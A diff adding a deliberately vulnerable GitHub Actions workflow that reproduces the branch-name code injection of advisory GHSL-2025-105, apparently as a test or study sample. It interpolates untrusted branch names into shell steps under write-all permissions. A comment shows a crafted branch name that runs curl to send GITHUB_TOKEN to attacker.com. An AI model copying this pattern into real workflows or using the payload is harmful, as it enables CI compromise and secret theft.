@@ -1,0 +1,35 @@
+# GHSL-2025-105: Code injection in vets-api ready_for_review.yml
+# Vulnerability: Unsanitized branch name in shell command
+# Affected: .github/workflows/ready_for_review.yml
+# Reference: https://securitylab.github.com/advisories/GHSL-2025-105_vets-api/
+
+name: Ready for Review (Vulnerable)
+
+on:
+  pull_request:
+    types: [ready_for_review]
+  workflow_run:
+    workflows: ["CI", "Tests", "Lint", "Build"]
+    types: [completed]
+
+permissions: write-all
+
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # VULNERABLE: Branch name directly interpolated in shell
+      - name: Get branch info
+        id: branch
+        run: |
+          echo "pr_branch=${{ github.head_ref }}" >> $GITHUB_OUTPUT
+
+      # VULNERABLE: workflow_run head_branch in shell
+      - name: Process workflow run
+        if: github.event_name == 'workflow_run'
+        run: |
+          HEAD_BRANCH="${{ github.event.workflow_run.head_branch }}"
+          echo "pr_branch=${{ github.event.workflow_run.head_branch }}" >> $GITHUB_OUTPUT
+          # Attacker can create branch: main"; curl attacker.com/steal?t=$GITHUB_TOKEN; echo "
